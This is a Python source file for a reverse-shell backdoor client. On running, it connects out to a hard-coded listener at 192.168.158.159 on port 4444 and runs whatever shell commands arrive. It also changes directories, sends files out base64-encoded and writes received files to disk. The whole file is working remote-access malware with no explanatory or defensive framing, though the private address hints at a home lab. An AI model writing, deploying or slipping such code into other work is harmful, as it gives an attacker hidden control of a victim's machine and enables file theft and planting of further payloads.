import socket
import subprocess
import json
import os
import base64

class Client:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    # def reliable_recv(self):
    #     json_data = self.connection.recv(1024).decode("utf-8")
    #     return json.loads(json_data)

    def reliable_recv(self):
        json_data = ""

        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True).decode("utf-8")
        
    
    def change_working_directory_to(self, path):
        os.chdir(path=path)
        return "<*-*> Changing working directory to " + path + " <*-*>"
    

    def read_file(self, path):
        with open(path, 'rb') as file:
            # return file.read()
            return base64.b64encode(file.read()).decode('utf-8') # Encode to Base64

    def write_file(self, path, content):
        with open(path, "wb") as file:
            # file.write(content)
            
            file.write(base64.b64decode(content))  # Decode Base64 string to bytes
            return "<-> Upload successfully"

    def run(self):
        while True:

            command  = self.reliable_recv()

            try: 

                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], content=command[2])
                else:
                    command_result = self.execute_system_command(command=command)
            except Exception as e:
                command_result = f"<-!-> Error during command execution: \n {e}"

            self.reliable_send(command_result)

        


# connection.send(bytes("\nHey! Its working.\n", 'utf-8')) 


client = Client("192.168.158.159",4444)
client.run()
